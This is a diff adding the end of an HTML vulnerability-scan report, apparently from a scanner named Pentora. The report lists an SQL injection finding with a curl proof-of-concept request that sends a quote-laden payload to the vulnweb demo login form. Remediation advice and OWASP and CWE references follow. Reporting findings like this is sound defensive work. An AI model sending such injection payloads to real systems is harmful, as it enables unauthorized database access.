+                            <pre>curl &#34;http://testphp.vulnweb.com/userinfo.php&#34; -e &#34;http://testphp.vulnweb.com/login.php&#34; -d &#34;uname=default&amp;pass=default%C2%BF%27%22%28&#34;</pre>
+                        </section>
+                        <section id="tab-vuln-21-21-5" style="min-height: 124px;" class="is-hidden">
+                            <pre>[&#39;WSTG-INPV-05&#39;]</pre>
+                        </section>
+
+                <dl><dt>Solutions</dt><dd>To protect against SQL injection, user input must not directly be embedded in SQL statements. Instead, user input must be escaped or filtered or parameterized statements must be used.</dd></dl>
+                <h5>References</h5>
+                <ul>
+                    <li><a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection">OWASP: SQL Injection</a></li>
+                    <li><a href="https://en.wikipedia.org/wiki/SQL_injection">Wikipedia: SQL injection</a></li>
+                    <li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command (&#39;SQL Injection&#39;)</a></li>
+                    <li><a href="https://owasp.org/www-community/attacks/Blind_SQL_Injection">OWASP: Blind SQL Injection</a></li>
+                </ul>
+                <br />
+                <hr>
+        </div>
+        <footer class="small" id="footer"><a href="#" id="pentora_link">Pentora 1.0.0</a> &copy; Pentora Team 2025</footer>
+	</div>
+    <script type="text/javascript" src="js/kube.min.js"></script>
+    <script>$K.init();</script>
+</body>
+</html>
